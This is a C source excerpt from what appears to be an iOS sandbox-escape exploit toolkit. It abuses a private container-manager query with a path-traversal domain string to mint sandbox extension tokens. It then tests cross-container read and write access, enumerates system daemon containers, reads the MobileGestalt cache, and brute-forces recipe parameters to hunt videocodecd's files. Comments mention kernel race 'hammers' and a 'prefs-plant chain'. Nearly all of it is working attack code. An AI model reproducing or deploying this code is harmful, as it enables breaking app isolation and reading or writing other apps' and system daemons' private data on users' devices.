    int64_t (*sb_consume)(const char *) = (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!q_create || !q_set_class || !q_set_group || !q_set_flags || !q_set_part ||
        !q_set_dom || !q_result || !q_free || !copy_tok || !sb_consume) {
        dlclose(mgr);
        return -1;   /* symbol resolve failed */
    }
    void *q = q_create();
    if (!q) { dlclose(mgr); return -2; }   /* query create failed */
    q_set_class(q, cls);
    xpc_object_t ident = grp ? xpc_string_create(grp) : NULL;
    if (grp && ident) q_set_group(q, ident);
    q_set_part(q, part);
    char *dom = NULL;
    if (asprintf(&dom, "../../../../../../../..%s", path) == -1) {
        q_free(q); dlclose(mgr);
        return -5;   /* asprintf failed (ident is ARC-managed) */
    }
    q_set_dom(q, dom);
    q_set_flags(q, flags);
    void *res = q_result(q);
    if (!res) { free(dom); q_free(q); dlclose(mgr); return -3; }   /* containermanager denied */
    char *tok = copy_tok(res);
    if (!tok) { free(dom); q_free(q); dlclose(mgr); return -4; }   /* kernel refused token */
    int64_t h = sb_consume(tok);
    free(tok); free(dom);
    q_free(q); dlclose(mgr);
    return h;   /* ident left to ARC */
}

int64_t  ds_esc_consume(const char *path)
{
    /* legacy wrapper: the 24A5355q-proven recipe (class 13 + gestaltcache +
     * part 3 + non-group flags). DENIED (-3) on shipping 26.6 since v155 -
     * kept so regression state stays visible. */
    return ds_esc_try(path, 13, "systemgroup.com.apple.mobilegestaltcache", 3,
                      UINT64_C(0x0000008000000000));
}

void  ds_esc_release(int64_t h)
{
    if (h < 0) return;
    int (*sb_rel)(int64_t) = (int (*)(int64_t))dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (sb_rel) sb_rel(h);
}

const char * ds_esc_err(long long h)
{
    switch (h) {
        case -1: return "dlsym resolve";
        case -2: return "query create";
        case -3: return "containermanager denied (patched?)";
        case -4: return "kernel refused token";
        case -5: return "asprintf";
        case -255: return "bad path";
        default: return "other";
    }
}

/* v155/v159: the taint-sentinel set shared by the ESC8 scan and the ESC9 hunt */
static const uint32_t g_esc_pats[6] = {
    0x7FC00000u,   /* NaN qscale taint */
    0x7F800000u,   /* +Inf lane/max taint */
    0xFF800000u,   /* -Inf min taint */
    0xDEADBEEFu,
    0xCAFEBABEu,
    0x7FFFFFFFu    /* INTMAX int-lane wrap */
};
static const char *g_esc_pnames[6] = { "NaN", "Inf", "-Inf", "DEADBEEF", "CAFEBABE", "INTMAX" };

/* v155: read one reachable file and scan it for the taint sentinels.
 * Returns 1 if the file was scanned (size in range), 0 otherwise. */
static int ds_esc_scan_file(const char *pfx, const char *tag, const char *path, off_t sz,
                            const uint32_t *pats, const char *const *pnames, int npat, int *hits)
{
    if (sz <= 0 || sz > (off_t)(4 * 1024 * 1024)) return 0;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    uint8_t *buf = (uint8_t *)malloc((size_t)sz);
    if (!buf) { close(fd); return 0; }
    ssize_t rd = read(fd, buf, (size_t)sz);
    close(fd);
    if (rd <= 0) { free(buf); return 0; }
    for (ssize_t i = 0; i + 4 <= rd; i++) {
        uint32_t w = (uint32_t)buf[i] | ((uint32_t)buf[i + 1] << 8) |
                     ((uint32_t)buf[i + 2] << 16) | ((uint32_t)buf[i + 3] << 24);
        for (int p = 0; p < npat; p++) {
            if (w == pats[p]) {
                (*hits)++;
                char hx[32] = {0};
                for (int bi = 0; bi < 12 && i + bi < rd; bi++)
                    snprintf(hx + (size_t)bi * 2, sizeof(hx) - (size_t)bi * 2, "%02x", buf[i + bi]);
                dprintf(STDOUT_FILENO, "%s  I[%s] ESC8 HIT %s @ %s+%ld ctx=%s\n",
                        pfx, tag, pnames[p], path, (long)i, hx);
                break;
            }
        }
    }
    free(buf);
    return 1;
}

void  ds_esc_row(const char *pfx, const char *tag, const char *path, int mode)
{
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] escape target=%s mode=%d (class-13 + traversal - bad_query port, no epoch use)\n",
            pfx, st0, tag, path, mode);
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume(path); return 0; }, &csSt);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] escape FAULTED sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
        return;
    }
    if (h < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE FAILED code=%lld (%s)\n", pfx, tag, (long long)h, ds_esc_err(h));
        return;
    }
    dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE OK handle=%lld (sandbox extension consumed)\n", pfx, tag, (long long)h);
    char priv[1152];
    if (strncmp(path, "/var/", 5) == 0) snprintf(priv, sizeof(priv), "/private%s", path);
    else snprintf(priv, sizeof(priv), "%s", path);
    if (mode == 0) {
        int fd = open(priv, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
        dprintf(STDOUT_FILENO, "%s  I[%s] open(O_RDWR) %s = %d errno=%d => %s\n", pfx, tag, priv, fd,
                fd >= 0 ? 0 : errno,
                fd >= 0 ? "CROSS-CONTAINER R/W OK" : "denied");
        if (fd >= 0) close(fd);
    } else if (mode == 1) {
        char f[1216];
        snprintf(f, sizeof(f), "%s/ds_esc_probe_%d.dat", priv, (int)getpid());
        int fd = open(f, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
        if (fd >= 0) {
            const char *m = "DS-ESC-PROBE-43805\n";
            ssize_t w = write(fd, m, strlen(m));
            close(fd);
            char rb[64]; ssize_t r = -1;
            int fd2 = open(f, O_RDONLY | O_CLOEXEC);
            if (fd2 >= 0) { r = read(fd2, rb, sizeof(rb) - 1); close(fd2); }
            int u = unlink(f);
            dprintf(STDOUT_FILENO, "%s  I[%s] write=%zd read=%zd unlink=%d => %s\n", pfx, tag, w, r, u,
                    (w > 0 && r > 0 && strncmp(rb, "DS-ESC-PROBE", 12) == 0 && u == 0)
                        ? "CROSS-CONTAINER WRITE+READBACK OK" : "write verify FAILED");
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] open(O_CREAT) errno=%d => denied\n", pfx, tag, errno);
        }
    } else if (mode == 2) {
        DIR *d = opendir(priv);
        if (d) {
            int n = 0;
            struct dirent *e;
            while ((e = readdir(d)) != NULL) { if (e->d_name[0] != '.') n++; }
            closedir(d);
            dprintf(STDOUT_FILENO, "%s  I[%s] opendir OK (%d entries) => SYSTEM-CONTAINER REACH\n", pfx, tag, n);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] opendir errno=%d => denied\n", pfx, tag, errno);
        }
    } else if (mode == 4) {
        /* v128: READ-ONLY MobileGestalt cache recon - ave.videoencoder imports _MGGetStringAnswer,
         * so the keys in this plist are the v129 daemon-manipulation candidates. NO WRITES. */
        int fd = open(priv, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
        if (fd < 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] open(O_RDONLY) errno=%d => denied\n", pfx, tag, errno);
        } else {
            off_t sz = lseek(fd, 0, SEEK_END);
            lseek(fd, 0, SEEK_SET);
            if (sz <= 0 || sz > (off_t)(8 * 1024 * 1024)) {
                dprintf(STDOUT_FILENO, "%s  I[%s] MG cache size=%lld (unexpected) - size receipt only\n", pfx, tag, (long long)sz);
                close(fd);
            } else {
                uint8_t *buf = (uint8_t *)malloc((size_t)sz);
                ssize_t rd = buf ? read(fd, buf, (size_t)sz) : -1;
                close(fd);
                if (rd > 0) {
                    dprintf(STDOUT_FILENO, "%s  I[%s] MG cache read %zd/%lld bytes (READ-ONLY - nothing written)\n", pfx, tag, rd, (long long)sz);
                    CFDataRef cd = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault, buf, (CFIndex)rd, kCFAllocatorNull);
                    if (cd) {
                        CFPropertyListRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault, cd, kCFPropertyListImmutable, NULL, NULL);
                        if (pl && CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
                            CFDictionaryRef d = (CFDictionaryRef)pl;
                            CFIndex n = CFDictionaryGetCount(d);
                            CFStringRef *keys = (CFStringRef *)malloc(sizeof(CFStringRef) * (size_t)(n > 0 ? n : 1));
                            CFDictionaryGetKeysAndValues(d, (const void **)keys, NULL);
                            int rel = 0;
                            for (CFIndex i = 0; i < n && i < 60; i++) {
                                char kb[256];
                                if (CFGetTypeID(keys[i]) == CFStringGetTypeID() &&
                                    CFStringGetCString(keys[i], kb, sizeof(kb), kCFStringEncodingUTF8)) {
                                    const void *val = NULL;
                                    CFDictionaryGetValueIfPresent(d, keys[i], &val);
                                    int isRel = (strstr(kb, "Video") || strstr(kb, "Encod") || strstr(kb, "Codec") ||
                                                strstr(kb, "Chip") || strstr(kb, "SoC") || strstr(kb, "HW") || strstr(kb, "hw"));
                                    if (isRel) {
                                        char vb[128]; vb[0] = 0;
                                        if (val && CFGetTypeID(val) == CFStringGetTypeID())
                                            CFStringGetCString((CFStringRef)val, vb, sizeof(vb), kCFStringEncodingUTF8);
                                        else if (val && CFGetTypeID(val) == CFNumberGetTypeID()) {
                                            SInt64 iv = 0; CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &iv);
                                            snprintf(vb, sizeof(vb), "%lld", (long long)iv);
                                        } else if (val && CFGetTypeID(val) == CFBooleanGetTypeID())
                                            snprintf(vb, sizeof(vb), "%s", CFBooleanGetValue((CFBooleanRef)val) ? "true" : "false");
                                        dprintf(STDOUT_FILENO, "%s  I[%s]   MGKEY %s = %s\n", pfx, tag, kb, vb[0] ? vb : "(non-scalar)");
                                        rel++;
                                    }
                                }
                            }
                            dprintf(STDOUT_FILENO, "%s  I[%s] MG dict keys=%lld AVE-relevant=%d (first 60 scanned)\n", pfx, tag, (long long)n, rel);
                            free(keys);
                        } else {
                            dprintf(STDOUT_FILENO, "%s  I[%s] MG cache not a dict plist (type=%ld) - raw read only\n", pfx, tag, pl ? (long)CFGetTypeID(pl) : 0);
                        }
                        if (pl) CFRelease(pl);
                        CFRelease(cd);
                    }
                    free(buf);
                } else {
                    dprintf(STDOUT_FILENO, "%s  I[%s] MG cache read failed rd=%zd errno=%d\n", pfx, tag, rd, errno);
                    free(buf);
                }
            }
        }
    } else if (mode == 5) {
        /* v128: Data/System daemon-container identify - which UUID = videocodecd/analyticsd? */
        DIR *d = opendir(priv);
        if (!d) {
            dprintf(STDOUT_FILENO, "%s  I[%s] opendir %s errno=%d\n", pfx, tag, priv, errno);
        } else {
            struct dirent *e;
            int shown = 0;
            while ((e = readdir(d)) != NULL && shown < 12) {
                if (e->d_name[0] == '.') continue;
                char prefs[1400];
                snprintf(prefs, sizeof(prefs), "%s/%s/Library/Preferences", priv, e->d_name);
                DIR *pd = opendir(prefs);
                char names[512] = "";
                if (pd) {
                    struct dirent *pe;
                    int nf = 0;
                    while ((pe = readdir(pd)) != NULL && nf < 4) {
                        if (pe->d_name[0] == '.') continue;
                        if (nf > 0) strncat(names, ", ", sizeof(names) - strlen(names) - 1);
                        strncat(names, pe->d_name, sizeof(names) - strlen(names) - 1);
                        nf++;
                    }
                    closedir(pd);
                }
                dprintf(STDOUT_FILENO, "%s  I[%s]   %s  prefs: %s\n", pfx, tag, e->d_name, names[0] ? names : "(none)");
                shown++;
            }
            closedir(d);
            dprintf(STDOUT_FILENO, "%s  I[%s] %d system containers listed (match com.apple.videocodecd / analyticsd in prefs)\n", pfx, tag, shown);
        }
    } else if (mode == 7) {
        /* v129: exact-path probe - the 07:28:41.38 kernel VIOLATION leaked videocodecd's real
         * cache dir (/private/var/mobile/Library/Caches/com.apple.videocodecd/ - Metal shader
         * cache) and the daemon reads user prefs per-encode (the powerlogd deny lines). Probe
         * whether class-13 reach extends to /var/mobile (the prefs-plant chain), then scan the
         * reachable System UUIDs' Caches/Documents for daemon state (the read-back oracle). */
        const char *probes[] = {
            "/var/mobile/Library/Caches/com.apple.videocodecd",
            "/var/mobile/Library/Caches/com.apple.videocodecd/com.apple.metal",
            "/var/mobile/Library/Preferences/com.apple.videocodecd.plist",
        };
        for (size_t pi = 0; pi < sizeof(probes) / sizeof(probes[0]); pi++) {
            char pp[1152];
            if (strncmp(probes[pi], "/var/", 5) == 0) snprintf(pp, sizeof(pp), "/private%s", probes[pi]);
            else snprintf(pp, sizeof(pp), "%s", probes[pi]);
            if (access(pp, F_OK) == 0)
                dprintf(STDOUT_FILENO, "%s  I[%s]   REACHABLE %s\n", pfx, tag, probes[pi]);
            else
                dprintf(STDOUT_FILENO, "%s  I[%s]   %s: %s\n", pfx, tag, probes[pi],
                        (errno == ENOENT) ? "ENOENT" : ((errno == EPERM || errno == EACCES) ? "DENIED" : "err"));
        }
        DIR *d = opendir(priv);
        if (d) {
            struct dirent *e;
            int shown = 0;
            while ((e = readdir(d)) != NULL) { if (e->d_name[0] != '.') shown++; }
            closedir(d);
            dprintf(STDOUT_FILENO, "%s  I[%s] %d system containers reachable\n", pfx, tag, shown);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] opendir %s errno=%d\n", pfx, tag, priv, errno);
        }
    } else if (mode == 8) {
        /* v155: the STAGED-DATA HUNT - walk the reachable dir (depth 2), read
         * every file <=4MB, scan for the RC-taint float sentinels + the classic
         * markers. A hit (file, offset) = the daemon STAGED our derived stats/
         * surface bytes on disk = a userspace-readable image of the surface. */
        const uint32_t *pats = g_esc_pats;
        const char *const *pnames = g_esc_pnames;
        DIR *d = opendir(priv);
        if (!d) {
            dprintf(STDOUT_FILENO, "%s  I[%s] ESC8 opendir %s errno=%d\n", pfx, tag, priv, errno);
        } else {
            int files = 0, hits = 0;
            struct dirent *e;
            char sub[1216];
            for (int pass = 0; pass < 2; pass++) {   /* pass 0: top level, pass 1: one subdir deep */
                if (pass == 1) rewinddir(d);
                while ((e = readdir(d)) != NULL) {
                    if (e->d_name[0] == '.') continue;
                    char p[1280];
                    snprintf(p, sizeof(p), "%s/%s", priv, e->d_name);
                    struct stat st;
                    if (stat(p, &st) != 0) continue;
                    if (S_ISDIR(st.st_mode)) {
                        if (pass == 0) snprintf(sub, sizeof(sub), "%s", p);   /* remember first dir */
                        continue;
                    }
                    if (pass == 1) continue;   /* files only at top level here */
                    files += ds_esc_scan_file(pfx, tag, p, (off_t)st.st_size, pats, pnames, 6, &hits);
                }
                if (pass == 0 && sub[0]) {
                    /* descend into the first subdir found (com.apple.metal etc.) */
                    DIR *sd = opendir(sub);
                    if (sd) {
                        struct dirent *se;
                        while ((se = readdir(sd)) != NULL) {
                            if (se->d_name[0] == '.') continue;
                            char sp[1400];
                            snprintf(sp, sizeof(sp), "%s/%s", sub, se->d_name);
                            struct stat sst;
                            if (stat(sp, &sst) != 0 || S_ISDIR(sst.st_mode)) continue;
                            files += ds_esc_scan_file(pfx, tag, sp, (off_t)sst.st_size, pats, pnames, 6, &hits);
                        }
                        closedir(sd);
                    }
                }
            }
            closedir(d);
            dprintf(STDOUT_FILENO, "%s  I[%s] ESC8 done: %d files scanned, %d marker hits "
                    "(NaN/Inf/-Inf/DEADBEEF/CAFEBABE/INTMAX) in %s\n", pfx, tag, files, hits, priv);
        }
    } else if (mode == 9) {
        /* v159: the RECIPE SWEEP - the 24A5355q class-13/gestaltcache recipe is
         * DENIED on this 26.6 boot, but the upstream bad_query capability list
         * claims /var/mobile/Containers/Data/{Application,InternalDaemon,
         * PluginKitPlugin} and Shared/AppGroup reach. Sweep class x group x
         * part x flags against three targets; then AUTO-HUNT the videocodecd
         * daemon container with the first working InternalDaemon recipe:
         * find its UUID dir (Library/Preferences/com.apple.videocodecd.plist)
         * and sentinel-scan Library/Caches + tmp (READ-ONLY). */
        static const char *tgts[3] = {
            "/var/mobile/Containers/Data/Application",
            "/var/mobile/Containers/Data/InternalDaemon",
            "/var/mobile/Library/Caches/com.apple.videocodecd",
        };
        /* discover OUR app groups (the iOS-26 'sacrifice' arm) via SecTask */
        char agrp[2][128]; int nagrp = 0;
        void *(*st_create)(CFAllocatorRef) = (void *(*)(CFAllocatorRef))dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        CFTypeRef (*st_copy)(void *, CFStringRef, CFErrorRef *) = (CFTypeRef (*)(void *, CFStringRef, CFErrorRef *))dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (st_create && st_copy) {
            void *tk = st_create(NULL);
            if (tk) {
                CFTypeRef v = st_copy(tk, CFSTR("com.apple.security.application-groups"), NULL);
                if (v && CFGetTypeID(v) == CFArrayGetTypeID()) {
                    CFIndex n = CFArrayGetCount((CFArrayRef)v);
                    for (CFIndex i = 0; i < n && nagrp < 2; i++) {
                        CFStringRef s = (CFStringRef)CFArrayGetValueAtIndex((CFArrayRef)v, i);
                        if (s && CFGetTypeID(s) == CFStringGetTypeID() &&
                            CFStringGetCString(s, agrp[nagrp], sizeof(agrp[nagrp]), kCFStringEncodingUTF8))
                            nagrp++;
                    }
                } else if (v && CFGetTypeID(v) == CFStringGetTypeID()) {
                    CFStringGetCString((CFStringRef)v, agrp[nagrp], sizeof(agrp[nagrp]), kCFStringEncodingUTF8);
                    nagrp++;
                }
                if (v) CFRelease(v);
                CFRelease(tk);
            }
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] ESC9 sweep: app groups discovered=%d%s%s\n", pfx, tag,
                nagrp, nagrp ? " [" : "", nagrp ? agrp[0] : "");
        int totalOk = 0;
        int64_t huntH = -999;
        for (int ti = 0; ti < 3; ti++) {
            const char *tgt = tgts[ti];
            int tgtOk = 0;
            const char *okGrp = NULL; uint64_t okCls = 0, okPart = 0, okFlg = 0;
            for (uint64_t cls = 1; cls <= 16 && !tgtOk; cls++) {
                /* group variants: none, gestaltcache, our app groups */
                for (int gi = 0; gi < 2 + nagrp && !tgtOk; gi++) {
                    const char *g = (gi == 0) ? NULL :
                                    (gi == 1) ? "systemgroup.com.apple.mobilegestaltcache" :
                                    agrp[gi - 2];
                    for (uint64_t part = 0; part <= 3 && !tgtOk; part++) {
                        static const uint64_t flgs[2] = { UINT64_C(0x0000008000000000), 0 };
                        for (int fi = 0; fi < 2 && !tgtOk; fi++) {
                            int64_t hh = ds_esc_try(tgt, cls, g, part, flgs[fi]);
                            if (hh >= 0) {
                                ds_esc_release(hh);
                                tgtOk = 1; totalOk++;
                                okGrp = g; okCls = cls; okPart = part; okFlg = flgs[fi];
                                dprintf(STDOUT_FILENO,
                                        "%s  I[%s] ESC9 OK %s: cls=%llu grp=%s part=%llu flags=0x%llx\n",
                                        pfx, tag, tgt, (unsigned long long)cls, g ? g : "(none)",
                                        (unsigned long long)part, (unsigned long long)flgs[fi]);
                            }
                        }
                    }
                }
            }
            if (!tgtOk)
                dprintf(STDOUT_FILENO, "%s  I[%s] ESC9 DENIED %s (all %d recipes)\n",
                        pfx, tag, tgt, 16 * (2 + nagrp) * 4 * 2);
            if (tgtOk && ti == 1) {   /* remember a working InternalDaemon recipe */
                huntH = ds_esc_try(tgt, okCls, okGrp, okPart, okFlg);
            }
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] ESC9 sweep done: %d/3 targets reachable\n", pfx, tag, totalOk);
        if (huntH >= 0) {
            /* AUTO-HUNT: walk /var/mobile/Containers/Data/InternalDaemon/<UUID>,
             * identify videocodecd's container by its prefs plist, sentinel-scan
             * Library/Caches + tmp. READ-ONLY. */
            const char *idroot = "/private/var/mobile/Containers/Data/InternalDaemon";
            DIR *dd = opendir(idroot);
            if (!dd) {
                dprintf(STDOUT_FILENO, "%s  I[%s] ESC9 hunt: opendir %s errno=%d\n", pfx, tag, idroot, errno);
            } else {
                struct dirent *de;
                int containers = 0, files = 0, hits = 0, foundVCD = 0;
                while ((de = readdir(dd)) != NULL) {
                    if (de->d_name[0] == '.') continue;
                    char base[1216];
                    snprintf(base, sizeof(base), "%s/%s", idroot, de->d_name);
                    struct stat st;
                    if (stat(base, &st) != 0 || !S_ISDIR(st.st_mode)) continue;
                    containers++;
                    char prefs[1400];
                    snprintf(prefs, sizeof(prefs), "%s/Library/Preferences/com.apple.videocodecd.plist", base);
                    int isVCD = (access(prefs, F_OK) == 0);
                    if (isVCD) foundVCD = 1;
                    /* scan every container's Caches+tmp; report loudest for videocodecd's */
                    static const char *subdirs[2] = { "/Library/Caches", "/tmp" };
                    for (int si = 0; si < 2; si++) {
                        char sd[1408];
                        snprintf(sd, sizeof(sd), "%s%s", base, subdirs[si]);
                        DIR *sdh = opendir(sd);
                        if (!sdh) continue;
                        struct dirent *se;
                        while ((se = readdir(sdh)) != NULL) {
                            if (se->d_name[0] == '.') continue;
                            char fp[1536];
                            snprintf(fp, sizeof(fp), "%s/%s", sd, se->d_name);
                            struct stat fst;
                            if (stat(fp, &fst) != 0 || S_ISDIR(fst.st_mode)) continue;
                            files += ds_esc_scan_file(pfx, tag, fp, (off_t)fst.st_size,
                                                      g_esc_pats, g_esc_pnames, 6, &hits);
                        }
                        closedir(sdh);
                    }
                }
                closedir(dd);
                dprintf(STDOUT_FILENO,
                        "%s  I[%s] ESC9 hunt: %d daemon containers walked (%s), %d files scanned, %d sentinel hits\n",
                        pfx, tag, containers, foundVCD ? "videocodecd IDENTIFIED" : "videocodecd prefs NOT seen",
                        files, hits);
            }
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] ESC9 hunt SKIPPED (no working InternalDaemon recipe)\n", pfx, tag);
        }
    }

    if (h >= 0) ds_esc_release(h);
    usleep(200000);
}

/* ---- 43805 race hammers (the FINDINGS 98.4 probe shapes) ----------------- */

/* one P1-style iteration: create a 2vuy HW session, prepare+encode 1 frame,
 * then IMMEDIATELY invalidate+release - NO CompleteFrames = the deferred-
 * surface free path (the kernel's 'delay to release surface' list). */
/* v136: g_opt_conn_poisoned definition moved here (used by ds_opt_teardown + all rows) */
volatile int g_opt_conn_poisoned = 0;

